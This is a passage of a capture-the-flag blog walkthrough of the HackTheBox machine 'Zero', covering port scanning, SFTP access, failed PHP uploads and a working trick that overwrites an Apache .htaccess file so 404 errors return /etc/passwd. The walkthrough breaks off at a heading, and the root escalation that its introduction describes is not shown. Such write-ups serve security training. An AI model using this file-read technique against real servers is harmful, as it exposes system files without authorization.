@@ -1,0 +1,1046 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Zero</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-zero">htb-zero</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-ten">htb-ten</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#htaccess">htaccess</a> <a class="post-tag" href="/tags#htaccess-file-read">htaccess-file-read</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#python-requests">python-requests</a> <a class="post-tag" href="/tags#python-paramiko">python-paramiko</a> <a class="post-tag" href="/tags#apache">apache</a> <a class="post-tag" href="/tags#apache2ctl">apache2ctl</a> <a class="post-tag" href="/tags#perl">perl</a> <a class="post-tag" href="/tags#apache-module">apache-module</a> <a class="post-tag" href="/tags#apxs">apxs</a> <a class="post-tag" href="/tags#apache-log-pipe">apache-log-pipe</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-08-12T09:00:00+00:00" itemprop="datePublished">Aug 12, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/08/12/htb-zero.html" style="color: #e6e6e6; text-decoration: none;">HTB: Zero</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/zero-cover.webp" type="image/webp"/>
+<img alt="Zero" class="include_image" loading="lazy" src="/img/zero-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Zero is all about abusing Apache. It’s a hosting provide, where I can get an account with SFTP access to upload files to be holder in a path on the site. I’ll overwrite the .htaccess file and use it to read files from the file system. I’ll write a Python script to automate this, and read files to find a password in the website database connection information. With a shell, I’ll see a script running every minute that looks at the Apache process in the process list and runs apache2ctl to verify the configuration is good. I’ll fake a process name and overload an argument to get apache2ctl running on a config I control. I’ll show a partial file read, a failed attempt at command injection, and two ways to get a shell as root.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/693 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/zero" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Zero</a> <a href="https://hackthebox.com/machines/zero" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-zero.webp" type="image/webp"/> <img alt="Zero" class="img-av" src="/icons/box-zero.png"/></picture></a><br/><a href="https://hackthebox.com/machines/zero" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1956015504260264383">12 Aug 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">12 Aug 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Insane">Insane [50]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.234.62
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-07 01:33 UTC
+...[snip]...
+Scanned at 2025-08-07 01:33:45 UTC for 7s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
+           Raw packets sent: 65970 (2.903MB) | Rcvd: 65536 (2.621MB)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.129.234.62
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-07 01:34 UTC
+Nmap scan report for 10.129.234.62
+Host is up (0.090s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 85:7b:10:68:1b:90:b6:10:52:57:f1:a9:fd:18:eb:6c (RSA)
+|   256 2e:61:8d:35:14:d6:92:3a:71:74:f7:80:ba:76:21:f3 (ECDSA)
+|_  256 d0:8b:7d:83:72:24:9c:b7:8f:bf:78:f9:16:05:8b:d9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Page moved.
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.14 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH and Apache</a> versions, the host is likely running Ubuntu 20.04 focal.</p>
+<p>All of the ports show a TTL of 63, which matches the <a href="/cheatsheets/os#os-identification">expected TTL</a> for Linux one hop away.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is for a hosting provider:</p>
+<div style="position: relative;">
+<picture>
+<source srcset="/img/image-20250806143357028.webp" type="image/webp"/>
+<img alt="image-20250806143357028" class="include_image" loading="lazy" src="/img/image-20250806143357028.png" style="max-height: 500px; object-fit: cover; object-position: top; width: -webkit-fill-available; mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px)); -webkit-mask-image: linear-gradient(rgb(0, 0, 0), rgb(0,0,0) calc(100% - 100px), rgba(0,0,0,0) calc(100% - 20px));"/>
+</picture>
+<a href="javascript:void(0)" onclick="click_expand_image(event)" style="position: absolute; bottom: 35px; right: 15px;" title="Click to expand for full content"><img alt="expand" class="expand-contract" src="/icons/expand.png"/></a>
+</div>
+<p>The page mentions using SFTP for upload, and hosting only static HTML pages.</p>
+<p>The “Statistics” link (<code class="language-plaintext highlighter-rouge">/stats.php</code>) has some stats:</p>
+<picture>
+<source srcset="/img/image-20250806144253317.webp" type="image/webp"/>
+<img alt="image-20250806144253317" class="include_image" loading="lazy" src="/img/image-20250806144253317.png"/>
+</picture>
+<p>The mention of web sockets is interesting. I don’t see any evidence of a web socket on this page.</p>
+<p>The “Sign up today” button on the front page loads <code class="language-plaintext highlighter-rouge">/signup.php</code>:</p>
+<picture>
+<source srcset="/img/image-20250806144440639.webp" type="image/webp"/>
+<img alt="image-20250806144440639" class="include_image" loading="lazy" src="/img/image-20250806144440639.png"/>
+</picture>
+<p>Clicking “Request credentials” returns a username and password:</p>
+<picture>
+<source srcset="/img/image-20250806144552191.webp" type="image/webp"/>
+<img alt="image-20250806144552191" class="include_image" loading="lazy" src="/img/image-20250806144552191.png"/>
+</picture>
+<p>This looks very similar to the setup in <a href="/2025/07/24/htb-ten.html#website---tcp-80">Ten</a>. I’ll add <code class="language-plaintext highlighter-rouge">zero.vl</code> to my local <code class="language-plaintext highlighter-rouge">hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.129.234.62 zero.vl
+</code></pre></div></div>
+<p>Its my site is located at <code class="language-plaintext highlighter-rouge">/~zro-afb97e8f/</code>, which is the given username prepended with “~”. Visiting shows a brick wall with a title bar of “Nothing here.”</p>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The page paths show that the site is built on PHP. The webserver is Apache, as shown by <code class="language-plaintext highlighter-rouge">nmap</code> and in the response headers:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 06 Aug 2025 18:49:31 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.41 (Ubuntu)</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Sat, 19 Feb 2022 23:21:10 GMT</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"cd-5d867412ce730-gzip"</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">205</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+</code></pre></div></div>
+<p>The 404 page is the <a href="/cheatsheets/404#apache--httpd">default Apache 404</a>:</p>
+<picture>
+<source srcset="/img/image-20250806153001913.webp" type="image/webp"/>
+<img alt="image-20250806153001913" class="include_image" loading="lazy" src="/img/image-20250806153001913.png"/>
+</picture>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://zero.vl <span class="nt">-x</span> php <span class="nt">--dont-extract-links</span>
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://zero.vl
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💲  Extensions            │ [php]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      272c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      269c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-green">200</span><span class="go">      GET        9l       25w      205c http://zero.vl/
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       75l      246w     3285c http://zero.vl/stats.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      114l      400w     5173c http://zero.vl/index.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET      820l     4248w    72818c http://zero.vl/info.php
+</span><span class="feroxbuster-green">200</span><span class="go">      GET       89l      269w     3675c http://zero.vl/signup.php
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      301c http://zero.vl/dist =&gt; </span><span class="feroxbuster-yellow">http://zero.vl/dist/</span><span class="go">
+[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     60000/60000   0s      </span><span class="feroxbuster-green">found</span><span class="go">:6       </span><span class="feroxbuster-red">errors</span><span class="go">:0
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m     30000/30000   275/s   http://zero.vl/ 
+[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 0s     30000/30000   326087/s http://zero.vl/dist/ =&gt; </span><span class="feroxbuster-blue">Directory listing</span><span class="go"> (add </span><span class="feroxbuster-yellow">--scan-dir-listings</span><span class="go"> to scan) (remove </span><span class="feroxbuster-yellow">--dont-extract-links</span><span class="go"> to scan)
+</span></code></pre></div></div>
+<p>The only new page is <code class="language-plaintext highlighter-rouge">/info.php</code>, which presents a standard PHPinfo page:</p>
+<div style="max-height: 300px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="/img/image-20250806145917075.png">
+<img alt="image-20250806145917075" src="/img/image-20250806145917075.png" style="clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 275px"><a href="/img/image-20250806145917075.png"><i>Click for full image</i></a></div>
+</div>
+<p>Nothing of immediate note here.</p>
+<h3 id="ssh--sftp---tcp-22">SSH / SFTP - TCP 22</h3>
+<h4 id="ssh">SSH</h4>
+<p>SFTP runs over SSH, so I’ll first check to see if I can just get a shell on the host:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> 2699d1a5 ssh zro-afb97e8f@zero.vl
+<span class="go">PTY allocation request failed on channel 0
+This service allows sftp connections only.
+Connection to 10.129.234.62 closed.
+</span></code></pre></div></div>
+<p>It fails. I cannot get a session. I’ll try telling it a command to run:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> 2699d1a5 ssh zro-afb97e8f@zero.vl bash
+<span class="go">This service allows sftp connections only.
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> 2699d1a5 ssh zro-afb97e8f@zero.vl <span class="nb">id</span>
+<span class="go">This service allows sftp connections only.
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">-t</code> will try to force a PTY, but it fails too:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> 2699d1a5 ssh zro-afb97e8f@zero.vl <span class="nt">-t</span> bash
+<span class="go">PTY allocation request failed on channel 0
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> 2699d1a5 ssh zro-afb97e8f@zero.vl <span class="nt">-t</span> <span class="nb">id</span>
+<span class="go">PTY allocation request failed on channel 0
+</span></code></pre></div></div>
+<h4 id="sftp">SFTP</h4>
+<p>It does work over SFTP:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> 2699d1a5 sftp zro-afb97e8f@zero.vl
+<span class="go">Connected to zero.vl.
+</span><span class="gp">sftp&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>It has a single folder:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sftp&gt; </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">drwxr-xr-x    3 root     root         4096 Aug  6 19:02 .
+drwxr-xr-x    3 root     root         4096 Aug  6 19:02 ..
+drwxr-xr-x    2 1001     1001         4096 Aug  6 19:02 public_html
+</span></code></pre></div></div>
+<p>It has an HTML page and an <code class="language-plaintext highlighter-rouge">.htaccess</code> file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sftp&gt; </span><span class="nb">cd </span>public_html/
+<span class="gp">sftp&gt; </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">drwxr-xr-x    2 1001     1001         4096 Aug  6 19:45 .
+drwxr-xr-x    3 root     root         4096 Aug  6 19:45 ..
+-rw-r--r--    1 root     root           49 Aug  6 19:45 .htaccess
+-rw-r--r--    1 1001     1001          349 Feb 15  2019 index.html
+</span><span class="gp">sftp&gt; </span>get index.html 
+<span class="go">Fetching /public_html/index.html to index.html
+</span><span class="gp">sftp&gt; </span>get .htaccess 
+<span class="go">Fetching /public_html/.htaccess to .htaccess
+</span></code></pre></div></div>
+<p>The HTML file is the file that’s being served on  “my” site:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;title&gt;</span>Nothing here.<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;style&gt;body</span> <span class="p">{</span> <span class="nl">margin</span><span class="p">:</span><span class="m">0</span><span class="p">;</span> <span class="nl">padding</span><span class="p">:</span><span class="m">0</span><span class="p">;</span> <span class="nl">background</span><span class="p">:</span><span class="sx">url("/dist/img/abstract-architecture-attractive-988873.jpg")</span> <span class="nb">no-repeat</span> <span class="nb">center</span> <span class="nb">center</span> <span class="nb">fixed</span><span class="p">;</span> <span class="nl">-webkit-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">-moz-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">-o-background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="nl">background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span> <span class="p">}</span><span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">.htaccess</code> file sets a custom header:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat</span> .htaccess 
+<span class="go">Header always set X-Zero-Customer 'zro-de834d1c'
+</span></code></pre></div></div>
+<p>That header is present in the response:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 06 Aug 2025 19:53:48 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.41 (Ubuntu)</span>
+<span class="na">X-Zero-Customer</span><span class="p">:</span> <span class="s">zro-de834d1c</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Fri, 15 Feb 2019 21:03:16 GMT</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"15d-581f51a8d6d00-gzip"</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">349</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=99</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+</code></pre></div></div>
+<h2 id="shell-as-zroadmin">Shell as zroadmin</h2>
+<h3 id="failures">Failures</h3>
+<h4 id="php-upload">PHP Upload</h4>
+<p>The most obvious way forward is to upload PHP and see if it executes. I’ll create a dummy PHP file:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">echo</span> <span class="s2">"test"</span><span class="p">;</span>
+</code></pre></div></div>
+<p>When I upload this it works fine:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sftp&gt; </span>put test.php
+<span class="go">Uploading test.php to /public_html/test.php
+</span></code></pre></div></div>
+<p>But it the site just returns the code, doesn’t execute it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://zero.vl/~zro-de834d1c/test.php
+<span class="go">&lt;?php
+
+echo "test";
+</span></code></pre></div></div>
+<h4 id="alternative-extensions">Alternative Extensions</h4>
+<p>I’ll try uploading that same file as some other common PHP extensions:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sftp&gt; </span>put test.php test.php3
+<span class="go">Uploading test.php to /public_html/test.php3
+</span><span class="gp">sftp&gt; </span>put test.php test.php4
+<span class="go">Uploading test.php to /public_html/test.php4
+</span><span class="gp">sftp&gt; </span>put test.php test.php5
+<span class="go">Uploading test.php to /public_html/test.php5
+</span><span class="gp">sftp&gt; </span>put test.php test.php6
+<span class="go">Uploading test.php to /public_html/test.php6
+</span><span class="gp">sftp&gt; </span>put test.php test.phps
+<span class="go">Uploading test.php to /public_html/test.phps
+</span><span class="gp">sftp&gt; </span>put test.php test.inc
+<span class="go">Uploading test.php to /public_html/test.inc
+</span></code></pre></div></div>
+<p>All but <code class="language-plaintext highlighter-rouge">.phps</code> return the raw file. <code class="language-plaintext highlighter-rouge">.phps</code> returns a 403.</p>
+<h4 id="htaccess-enable-php">.htaccess Enable PHP</h4>
+<p>If the site isn’t processing PHP pages in this directory, perhaps I can use <code class="language-plaintext highlighter-rouge">.htaccess</code> to make it. I’ll make a <code class="language-plaintext highlighter-rouge">.htaccess</code> file with an additional line:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cp</span> .htaccess htaccess-php
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>vim htaccess-php
+<span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>htaccess-php 
+<span class="go">Header always set X-Zero-Customer 'zro-de834d1c'
+AddHandler application/x-httpd-php .php
+</span></code></pre></div></div>
+<p>Trying to upload this on top of the existing <code class="language-plaintext highlighter-rouge">.htaccess</code> fails:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sftp&gt; </span>put htaccess-php .htaccess 
+<span class="go">Uploading htaccess-php to /public_html/.htaccess
+dest open "/public_html/.htaccess": Permission denied
+</span></code></pre></div></div>
+<p>That’s because the file is owned by root, and only writable by root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sftp&gt; </span><span class="nb">ls</span> <span class="nt">-la</span> 
+<span class="go">drwxr-xr-x    2 1001     1001         4096 Aug  6 19:57 .
+drwxr-xr-x    3 root     root         4096 Aug  6 19:45 ..
+-rw-r--r--    1 root     root           49 Aug  6 19:45 .htaccess
+-rw-r--r--    1 1001     1001          349 Feb 15  2019 index.html
+-rw-rw-r--    1 1001     1001           20 Aug  6 19:57 test.inc
+-rw-rw-r--    1 1001     1001           20 Aug  6 19:55 test.php
+-rw-rw-r--    1 1001     1001           20 Aug  6 19:57 test.php3
+-rw-rw-r--    1 1001     1001           20 Aug  6 19:57 test.php4
+-rw-rw-r--    1 1001     1001           20 Aug  6 19:57 test.php5
+-rw-rw-r--    1 1001     1001           20 Aug  6 19:57 test.php6
+-rw-rw-r--    1 1001     1001           20 Aug  6 19:57 test.phps
+</span></code></pre></div></div>
+<p>I’ll notice that 1001 is the owner of all the files I’ve uploaded, as well as the current directory. That means I should be able to move files, even files I don’t own and can’t write. It works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sftp&gt; </span>rename .htaccess .htaccess.bk
+<span class="gp">sftp&gt; </span>put htaccess-php .htaccess
+<span class="go">Uploading htaccess-php to /public_html/.htaccess
+</span></code></pre></div></div>
+<p>Unfortunately, PHP still doesn’t execute.</p>
+<h3 id="file-read-via-htaccess">File Read via .htaccess</h3>
+<h4 id="poc">POC</h4>
+<p>Now that I can control <code class="language-plaintext highlighter-rouge">.htaccess</code>, there are a lot more things to try. <a href="https://medium.com/@insecurity_92477/utilizing-htaccess-for-exploitation-purposes-part-1-5733dd7fc8eb">This post</a> from re2libc talks about many different ways to abuse <code class="language-plaintext highlighter-rouge">.htaccess</code> files. None of them really worked on their own, but this section talked about using error pages to redirect users to a malicious site:</p>
+<picture>
+<source srcset="/img/image-20250806155244955.webp" type="image/webp"/>
+<img alt="image-20250806155244955" class="include_image" loading="lazy" src="/img/image-20250806155244955.png"/>
+</picture>
+<p>What if instead of a remote site, I have the error page show a file? I’ll generate a <code class="language-plaintext highlighter-rouge">.htaccess</code> file to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Header always <span class="nb">set </span>X-Zero-Customer <span class="s1">'zro-de834d1c'</span>
+ErrorDocument 404 %<span class="o">{</span>file:/etc/passwd<span class="o">}</span>
+</code></pre></div></div>
+<p>Now triggering a 404 response will return <code class="language-plaintext highlighter-rouge">passwd</code>:</p>
+<div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl http://zero.vl/~zro-de834d1c/0
+<span class="go">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:111:1::/var/cache/pollinate:/bin/false
+mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
+ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+zroadmin:x:666:666::/home/zroadmin:/bin/bash
+fwupd-refresh:x:114:121:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+_laurel:x:997:997::/var/log/laurel:/bin/false
+zro-de834d1c:x:1001:1001::/home/zro-de834d1c:/bin/false
+</span></code></pre></div></div>
+<h4 id="script">Script</h4>
